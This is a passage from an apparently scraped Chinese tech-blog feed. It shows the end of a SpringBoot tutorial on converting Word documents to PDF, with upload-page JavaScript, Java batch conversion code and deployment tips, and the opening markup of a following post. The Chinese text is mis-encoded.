        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æŠŠä½ çš„Wordæ–‡æ¡£æ‰”è¿›æ¥ï¼Œè¿˜ä½ ä¸€ä¸ªä¹–å·§çš„PDFï¼<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"drop-zone"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"dropZone"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>æ‹–æ‹½Wordæ–‡ä»¶åˆ°è¿™é‡Œ<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æˆ–è€… <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color: #2196F3; cursor: pointer;"</span>&gt;</span>ç‚¹å‡»é€‰æ‹©æ–‡ä»¶
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"fileInput"</span> <span class="hljs-attr">accept</span>=<span class="hljs-string">".docx,.doc"</span> <span class="hljs-attr">hidden</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"convert-btn"</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"convertToPdf()"</span>&gt;</span>
            å¼€å§‹å˜å½¢ï¼
        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress-bar"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"progressBar"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"progress-fill"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"progressFill"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"status"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"margin-top: 20px;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">const</span> dropZone = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'dropZone'</span>);
        <span class="hljs-keyword">const</span> fileInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'fileInput'</span>);
        <span class="hljs-keyword">let</span> selectedFile = <span class="hljs-literal">null</span>;
        
        <span class="hljs-comment">// æ‹–æ‹½åŠŸèƒ½</span>
        dropZone.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'dragover'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
            e.<span class="hljs-title function_">preventDefault</span>();
            dropZone.<span class="hljs-property">style</span>.<span class="hljs-property">background</span> = <span class="hljs-string">'#e8f5e9'</span>;
        });
        
        dropZone.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'drop'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
            e.<span class="hljs-title function_">preventDefault</span>();
            dropZone.<span class="hljs-property">style</span>.<span class="hljs-property">background</span> = <span class="hljs-string">'#f9f9f9'</span>;
            selectedFile = e.<span class="hljs-property">dataTransfer</span>.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = 
                <span class="hljs-string">`å·²é€‰æ‹©: &lt;strong&gt;<span class="hljs-subst">${selectedFile.name}</span>&lt;/strong&gt;`</span>;
        });
        
        fileInput.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'change'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
            selectedFile = e.<span class="hljs-property">target</span>.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = 
                <span class="hljs-string">`å·²é€‰æ‹©: &lt;strong&gt;<span class="hljs-subst">${selectedFile.name}</span>&lt;/strong&gt;`</span>;
        });
        
        <span class="hljs-comment">// è½¬æ¢å‡½æ•°</span>
        <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">convertToPdf</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">if</span> (!selectedFile) {
                <span class="hljs-title function_">alert</span>(<span class="hljs-string">'è¯·å…ˆé€‰æ‹©ä¸€ä¸ªWordæ–‡ä»¶ï¼'</span>);
                <span class="hljs-keyword">return</span>;
            }
            
            <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();
            formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'file'</span>, selectedFile);
            
            <span class="hljs-comment">// æ˜¾ç¤ºè¿›åº¦æ¡</span>
            <span class="hljs-keyword">const</span> progressBar = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'progressBar'</span>);
            <span class="hljs-keyword">const</span> progressFill = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'progressFill'</span>);
            progressBar.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'block'</span>;
            
            <span class="hljs-comment">// æ¨¡æ‹Ÿè¿›åº¦ï¼ˆå®é™…é¡¹ç›®å¯ä»¥ç”¨WebSocketï¼‰</span>
            <span class="hljs-keyword">let</span> progress = <span class="hljs-number">0</span>;
            <span class="hljs-keyword">const</span> interval = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
                progress += <span class="hljs-number">10</span>;
                progressFill.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">`<span class="hljs-subst">${progress}</span>%`</span>;
                <span class="hljs-keyword">if</span> (progress &gt;= <span class="hljs-number">90</span>) <span class="hljs-built_in">clearInterval</span>(interval);
            }, <span class="hljs-number">300</span>);
            
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/doc-transform/word-to-pdf'</span>, {
                    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
                    <span class="hljs-attr">body</span>: formData
                });
                
                <span class="hljs-built_in">clearInterval</span>(interval);
                progressFill.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">'100%'</span>;
                
                <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) {
                    <span class="hljs-comment">// ä¸‹è½½PDF</span>
                    <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">blob</span>();
                    <span class="hljs-keyword">const</span> url = <span class="hljs-variable language_">window</span>.<span class="hljs-property">URL</span>.<span class="hljs-title function_">createObjectURL</span>(blob);
                    <span class="hljs-keyword">const</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'a'</span>);
                    a.<span class="hljs-property">href</span> = url;
                    a.<span class="hljs-property">download</span> = selectedFile.<span class="hljs-property">name</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\.docx?$/i</span>, <span class="hljs-string">'.pdf'</span>);
                    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
                    a.<span class="hljs-title function_">click</span>();
                    a.<span class="hljs-title function_">remove</span>();
                    
                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = 
                        <span class="hljs-string">'è½¬æ¢æˆåŠŸï¼PDFå·²å¼€å§‹ä¸‹è½½~'</span>;
                    
                    <span class="hljs-comment">// 3ç§’åé‡ç½®</span>
                    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                        progressBar.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
                        progressFill.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">'0%'</span>;
                        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">''</span>;
                    }, <span class="hljs-number">3000</span>);
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">const</span> errorText = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">text</span>();
                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = 
                        <span class="hljs-string">`è½¬æ¢å¤±è´¥: <span class="hljs-subst">${errorText}</span>`</span>;
                }
            } <span class="hljs-keyword">catch</span> (error) {
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = 
                    <span class="hljs-string">`ç½‘ç»œé”™è¯¯: <span class="hljs-subst">${error.message}</span>`</span>;
            }
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h2 data-id="heading-10">é«˜çº§åŠŸèƒ½æ‰©å±•</h2>
<h3 data-id="heading-11">æ‰¹é‡è½¬æ¢ï¼ˆç¾¤å˜æ¨¡å¼ï¼‰</h3>
<pre><code class="hljs language-arduino" lang="arduino">@Service
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BatchConversionService</span> {
    
    @Async  <span class="hljs-comment">// å¼‚æ­¥å¤„ç†ï¼Œä¸å¡ç•Œé¢</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;List&lt;<span class="hljs-built_in">File</span>&gt;&gt; <span class="hljs-built_in">convertMultiple</span>(List&lt;MultipartFile&gt; files) {
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"å¼€å§‹æ‰¹é‡è½¬æ¢ï¼Œå…±"</span> + files.<span class="hljs-built_in">size</span>() + <span class="hljs-string">"ä¸ªæ–‡ä»¶ï¼Œå†²é¸­ï¼"</span>);
        
        List&lt;<span class="hljs-built_in">File</span>&gt; pdfFiles = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
        List&lt;CompletableFuture&lt;<span class="hljs-built_in">File</span>&gt;&gt; futures = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; files.<span class="hljs-built_in">size</span>(); i++) {
            <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> index = i;
            CompletableFuture&lt;<span class="hljs-built_in">File</span>&gt; future = CompletableFuture.<span class="hljs-built_in">supplyAsync</span>(() -&gt; {
                <span class="hljs-keyword">try</span> {
                    System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"æ­£åœ¨è½¬æ¢ç¬¬"</span> + (index + <span class="hljs-number">1</span>) + <span class="hljs-string">"ä¸ªæ–‡ä»¶..."</span>);
                    <span class="hljs-type">byte</span>[] pdfBytes = WordToPdfConverter.<span class="hljs-built_in">convert</span>(<span class="hljs-built_in">convertToFile</span>(files.<span class="hljs-built_in">get</span>(index)));
                    <span class="hljs-built_in">File</span> pdfFile = <span class="hljs-keyword">new</span> <span class="hljs-built_in">File</span>(<span class="hljs-string">"converted_"</span> + index + <span class="hljs-string">".pdf"</span>);
                    Files.<span class="hljs-built_in">write</span>(pdfFile.<span class="hljs-built_in">toPath</span>(), pdfBytes);
                    <span class="hljs-keyword">return</span> pdfFile;
                } <span class="hljs-built_in">catch</span> (Exception e) {
                    System.err.<span class="hljs-built_in">println</span>(<span class="hljs-string">"ç¬¬"</span> + (index + <span class="hljs-number">1</span>) + <span class="hljs-string">"ä¸ªæ–‡ä»¶è½¬æ¢å¤±è´¥: "</span> + e.<span class="hljs-built_in">getMessage</span>());
                    <span class="hljs-keyword">return</span> null;
                }
            });
            futures.<span class="hljs-built_in">add</span>(future);
        }
        
        <span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰è½¬æ¢å®Œæˆ</span>
        CompletableFuture.<span class="hljs-built_in">allOf</span>(futures.<span class="hljs-built_in">toArray</span>(<span class="hljs-keyword">new</span> CompletableFuture[<span class="hljs-number">0</span>])).<span class="hljs-built_in">join</span>();
        
        <span class="hljs-keyword">for</span> (CompletableFuture&lt;<span class="hljs-built_in">File</span>&gt; future : futures) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-built_in">File</span> pdf = future.<span class="hljs-built_in">get</span>();
                <span class="hljs-keyword">if</span> (pdf != null) pdfFiles.<span class="hljs-built_in">add</span>(pdf);
            } <span class="hljs-built_in">catch</span> (Exception e) {
                <span class="hljs-comment">// å¿½ç•¥å¤±è´¥çš„æ–‡ä»¶</span>
            }
        }
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"æ‰¹é‡è½¬æ¢å®Œæˆï¼æˆåŠŸ: "</span> + pdfFiles.<span class="hljs-built_in">size</span>() + 
                          <span class="hljs-string">"/"</span> + files.<span class="hljs-built_in">size</span>() + <span class="hljs-string">" ä¸ªæ–‡ä»¶"</span>);
        <span class="hljs-keyword">return</span> CompletableFuture.<span class="hljs-built_in">completedFuture</span>(pdfFiles);
    }
}
</code></pre>
<h3 data-id="heading-12">è½¬æ¢è®°å½•ï¼ˆå˜å½¢æ¡£æ¡ˆå®¤ï¼‰</h3>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Entity</span>
<span class="hljs-variable">@Table</span>(name = <span class="hljs-string">"conversion_records"</span>)
<span class="hljs-variable">@Data</span>
<span class="hljs-variable">@NoArgsConstructor</span>
<span class="hljs-variable">@AllArgsConstructor</span>
public class ConversionRecord {
    <span class="hljs-variable">@Id</span>
    <span class="hljs-variable">@GeneratedValue</span>(strategy = GenerationType.IDENTITY)
    private Long id;
    
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">originalFileName</span>;
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">pdfFileName</span>;
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">Long</span> <span class="hljs-selector-tag">originalSize</span>;
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">Long</span> <span class="hljs-selector-tag">pdfSize</span>;
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">LocalDateTime</span> <span class="hljs-selector-tag">conversionTime</span>;
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">status</span>;  <span class="hljs-comment">// SUCCESS, FAILED, PROCESSING</span>
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">errorMessage</span>;
    
    @<span class="hljs-selector-tag">PrePersist</span>
    <span class="hljs-selector-tag">protected</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">onCreate</span>() {
        <span class="hljs-selector-tag">conversionTime</span> = <span class="hljs-selector-tag">LocalDateTime</span><span class="hljs-selector-class">.now</span>();
    }
}

@<span class="hljs-selector-tag">Repository</span>
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">interface</span> <span class="hljs-selector-tag">ConversionRecordRepository</span> <span class="hljs-selector-tag">extends</span> <span class="hljs-selector-tag">JpaRepository</span>&lt;<span class="hljs-selector-tag">ConversionRecord</span>, <span class="hljs-selector-tag">Long</span>&gt; {
    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">ConversionRecord</span>&gt; <span class="hljs-selector-tag">findByStatusOrderByConversionTimeDesc</span>(String status);
}
</code></pre>
<h2 data-id="heading-13">éƒ¨ç½²ä¸ä¼˜åŒ–å»ºè®®</h2>
<h3 data-id="heading-14">1. æ€§èƒ½ä¼˜åŒ–</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml æ·»åŠ </span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">tomcat:</span>
    <span class="hljs-attr">max-threads:</span> <span class="hljs-number">200</span>  <span class="hljs-comment"># å¢åŠ çº¿ç¨‹æ•°å¤„ç†å¹¶å‘è½¬æ¢</span>
    <span class="hljs-attr">min-spare-threads:</span> <span class="hljs-number">20</span>

<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">task:</span>
    <span class="hljs-attr">execution:</span>
      <span class="hljs-attr">pool:</span>
        <span class="hljs-attr">core-size:</span> <span class="hljs-number">10</span>  <span class="hljs-comment"># å¼‚æ­¥ä»»åŠ¡çº¿ç¨‹æ± </span>
        <span class="hljs-attr">max-size:</span> <span class="hljs-number">50</span>
</code></pre>
<h3 data-id="heading-15">2. å†…å­˜ç®¡ç†</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryWatcher</span> {
    
    <span class="hljs-meta">@Scheduled(fixedRate = 60000)</span>  <span class="hljs-comment">// æ¯åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitorMemory</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">usedMemory</span> <span class="hljs-operator">=</span> Runtime.getRuntime().totalMemory() - 
                         Runtime.getRuntime().freeMemory();
        <span class="hljs-type">long</span> <span class="hljs-variable">maxMemory</span> <span class="hljs-operator">=</span> Runtime.getRuntime().maxMemory();
        
        <span class="hljs-type">double</span> <span class="hljs-variable">usagePercentage</span> <span class="hljs-operator">=</span> (<span class="hljs-type">double</span>) usedMemory / maxMemory * <span class="hljs-number">100</span>;
        
        <span class="hljs-keyword">if</span> (usagePercentage &gt; <span class="hljs-number">80</span>) {
            System.out.println(<span class="hljs-string">"å†…å­˜è­¦å‘Šï¼šä½¿ç”¨ç‡ "</span> + 
                String.format(<span class="hljs-string">"%.1f"</span>, usagePercentage) + <span class="hljs-string">"%"</span>);
            <span class="hljs-comment">// è§¦å‘åƒåœ¾å›æ”¶</span>
            System.gc();
        }
    }
}
</code></pre>
<h2 data-id="heading-16">æ€»ç»“ï¼šWordè½¬PDFçš„å¥‡å¹»æ—…ç¨‹ç»ˆç‚¹ç«™</h2>
<p>ç»è¿‡è¿™ä¸€ç•ªæŠ˜è…¾ï¼Œæˆ‘ä»¬æˆåŠŸæ‰“é€ äº†ä¸€ä¸ª<strong>SpringBootç‰Œæ–‡æ¡£å˜å½¢é‡‘åˆš</strong>ï¼æ€»ç»“ä¸€ä¸‹è¿™åœºå†’é™©ï¼š</p>
<h3 data-id="heading-17">æˆ‘ä»¬å®ç°äº†ä»€ä¹ˆï¼š</h3>
<ol>
<li><strong>æ ¼å¼é©¯åŒ–</strong>ï¼šæŠŠè‡ªç”±çš„Wordå˜æˆè§„çŸ©çš„PDF</li>
<li><strong>å¼‚æ­¥å¤„ç†</strong>ï¼šå¤§æ–‡ä»¶è½¬æ¢ä¸å¡ç•Œé¢</li>
<li><strong>è¿›åº¦ç›‘æ§</strong>ï¼šå®æ—¶æŸ¥çœ‹è½¬æ¢è¿›åº¦</li>
<li><strong>é”™è¯¯å¤„ç†</strong>ï¼šä¼˜é›…å¤„ç†å„ç§æ„å¤–æƒ…å†µ</li>
<li><strong>æ‰¹é‡æ“ä½œ</strong>ï¼šä¸€æ¬¡æ€§é©¯åŒ–æ•´ä¸ªWordæ–‡æ¡£å®¶æ—</li>
</ol>
<h3 data-id="heading-18">æ³¨æ„äº‹é¡¹ï¼š</h3>
<ol>
<li><strong>å­—ä½“é—®é¢˜</strong>ï¼šæœ‰äº›ç‰¹æ®Šå­—ä½“PDFå¯èƒ½ä¸è®¤è¯†ï¼Œéœ€è¦é¢å¤–å¤„ç†</li>
<li><strong>å¤æ‚æ ¼å¼</strong>ï¼šWordé‡Œçš„é«˜çº§æ’ç‰ˆï¼ˆå¦‚æ–‡æœ¬æ¡†ã€è‰ºæœ¯å­—ï¼‰å¯èƒ½å˜å½¢</li>
<li><strong>å†…å­˜æ¶ˆè€—</strong>ï¼šå¤§æ–‡æ¡£è½¬æ¢æ—¶æ³¨æ„å†…å­˜æº¢å‡º</li>
<li><strong>å¹¶å‘é™åˆ¶</strong>ï¼šåŒæ—¶è½¬æ¢å¤ªå¤šæ–‡æ¡£å¯èƒ½å¯¼è‡´æœåŠ¡å™¨å–˜ä¸è¿‡æ°”</li>
</ol>
<p>Wordè½¬PDFå°±åƒç»™æ–‡æ¡£ç©¿ä¸Šâ€œé˜²æ”¹é“ ç”²â€ï¼ŒSpringBootå°±æ˜¯æˆ‘ä»¬æ‰“é€ è¿™å‰¯é“ ç”²çš„æ™ºèƒ½å·¥å‚ã€‚è™½ç„¶è¿‡ç¨‹ä¸­ä¼šé‡åˆ°å„ç§å¥‡è‘©æ ¼å¼çš„â€œåˆºå¤´æ–‡æ¡£â€ï¼Œä½†åªè¦æœ‰è€å¿ƒè°ƒè¯•ï¼Œæœ€ç»ˆéƒ½èƒ½æŠŠå®ƒä»¬æ²»ç†å¾—æœæœå¸–å¸–ï¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3131e8e3e124b91afd66148721634fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665866&amp;x-signature=2mnwm4puxTRh%2Bf5b5QCKh6UGPUs%3D" alt="æ–‡æ¡£å˜å½¢è®°ï¼ŒSpringBootå®æˆ˜ï¼Œ3æ­¥è®©Wordä¹–ä¹–å˜PDF.png" loading="lazy"/></p>
<p><strong>è°¢è°¢ä½ çœ‹æˆ‘çš„æ–‡ç« ï¼Œæ—¢ç„¶çœ‹åˆ°è¿™é‡Œäº†ï¼Œå¦‚æœè§‰å¾—ä¸é”™ï¼Œéšæ‰‹ç‚¹ä¸ªèµã€è½¬å‘ã€åœ¨çœ‹ä¸‰è¿å§ï¼Œæ„Ÿè°¢æ„Ÿè°¢ã€‚é‚£æˆ‘ä»¬ï¼Œä¸‹æ¬¡å†è§ã€‚</strong></p>
<p>æ‚¨çš„ä¸€é”®ä¸‰è¿ï¼Œæ˜¯æˆ‘æ›´æ–°çš„æœ€å¤§åŠ¨åŠ›ï¼Œè°¢è°¢</p>
<p>å±±æ°´æœ‰ç›¸é€¢ï¼Œæ¥æ—¥çš†å¯æœŸï¼Œè°¢è°¢é˜…è¯»ï¼Œæˆ‘ä»¬å†ä¼š</p>
<p>æˆ‘æ‰‹ä¸­çš„é‡‘ç®æ£’ï¼Œä¸Šèƒ½é€šå¤©ï¼Œä¸‹èƒ½æ¢æµ·</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[èƒ½çœäº‹â€ã€‚SpringBoot+MyBatis-Plusï¼šå¼€å‘æ•ˆç‡æå‡10å€ï¼]]></title>    <link>https://juejin.cn/post/7589181008098705423</link>    <guid>https://juejin.cn/post/7589181008098705423</guid>    <pubDate>2025-12-30T02:16:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589181008098705423" data-draft-id="7589206614929195048" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="èƒ½çœäº‹â€ã€‚SpringBoot+MyBatis-Plusï¼šå¼€å‘æ•ˆç‡æå‡10å€ï¼"/> <meta itemprop="keywords" content="MyBatis,Spring Boot,Java"/> <meta itemprop="datePublished" content="2025-12-30T02:16:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°åè¯´Java"/> <meta itemprop="url" content="https://juejin.cn/user/3898184413750203"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            èƒ½çœäº‹â€ã€‚SpringBoot+MyBatis-Plusï¼šå¼€å‘æ•ˆç‡æå‡10å€ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3898184413750203/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°åè¯´Java
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:16:35.000Z" title="Tue Dec 30 2025 02:16:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid 